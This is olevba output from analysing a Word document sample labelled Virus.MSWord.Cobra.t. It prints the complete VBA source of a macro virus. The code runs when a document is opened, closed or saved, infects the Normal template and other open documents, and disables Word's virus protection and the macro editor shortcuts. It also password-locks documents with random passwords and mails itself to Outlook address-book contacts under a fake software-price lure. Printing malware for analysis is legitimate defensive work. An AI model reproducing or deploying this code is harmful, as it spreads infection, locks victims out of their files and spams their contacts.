olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jacket.bas 
in file: ./Virus.MSWord.Cobra.t - OLE stream: 'Macros/VBA/Jacket'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=> Step 2
Sub AutoOpen()
Call InfectDocNor
End Sub
Sub AutoClose()
Call InfectDocNor
End Sub
Sub FileOpen()
Call InfectDocNor
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileNew()
Call InfectDocNor
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileSave()
Call InfectDocNor
If ActiveDocument.Saved = False Then
Dialogs(wdDialogFileSave).Show
End If
End Sub
Sub InfectDocNor()
On Error Resume Next
Dim IncDoc, IncNor As Boolean
Dim PassDay, PassChars
Dim UDO, DMN, BUOS
CustomizationContext = NormalTemplate
With Options
.VirusProtection = False
.SaveNormalPrompt = False
.ConfirmConversions = False
End With
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Macro").Visible = False
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Application.UserAddress = "Liton" + Chr(13) + "Shibrampur" + Chr(13) + "Burichang" + Chr(13) + "Comilla" + Chr(13) + "Bangladesh."
IncNor = False
For Each Ad In Documents
IncDoc = False
For Each MC In Ad.VBProject.VBComponents
If MC.Name = "Jacket" Then IncDoc = True
If MC.Name <> "ThisDocument" And MC.Name <> "Jacket" And MC.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=Ad.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncDoc = False Then
Application.OrganizerCopy Source:=ActiveDocument.AttachedTemplate.FullName, Destination:=Ad.FullName, Name:="Jacket", Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MC In NormalTemplate.VBProject.VBComponents
If MC.Name = "Jacket" Then IncNor = True
If MC.Name <> "ThisDocument" And MC.Name <> "Jacket" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=MC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
If IncNor = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jacket", Object:=wdOrganizerObjectProjectItems
End If
PassDay = WeekDay(Now)
If PassDay >= 0 And PassDay <= 3 Then
If ActiveDocument.HasPassword = False Then
PassChars = "Apr" & Int(Rnd(PassDay) * Day(Now))
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdformatnormal, Password:=PassChars
System.PrivateProfileString("", "HKEY_CURRENT_USER\Apr30\PassWordList\", ActiveDocument.FullName) = PassChars
End If
End If
If Dir(Application.StartupPath + "\Apr30.dot") <> "Apr30.dot" Then
ActiveDocument.SaveAs FileName:=Application.StartupPath + "\Apr30.dot", FileFormat:=wdFormatTemplate
End If
Set UDO = CreateObject("Outlook.Application")
Set DMN = UDO.GetNameSpace("MAPI")
DMN.Logon "profile", "password"
For l = DMN.AddressLists.Count To 1 Step -1
Set ADB = DMN.AddressLists(l)
i = 0
Set BUOS = UDO.CreateItem(0)
For t = ADB.AdressEntries.Count To 1 Step -1
o = ADB.AddressEntries(i)
BUOS.Recipients.Add o
i = i + 1
If i = ADB.AddressEntries.Count - Month(Now) Then
t = 1
End If
Next t
BUOS.Subject = "Important Message From QuickSoft (Via" + Application.UserName + ")."
BUOS.Body = "Price of some new Software:="
BUOS.Attachments.Add ActiveDocument.FullName
BUOS.Send
o = ""
Next l
DMN.Logoff
End Sub
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

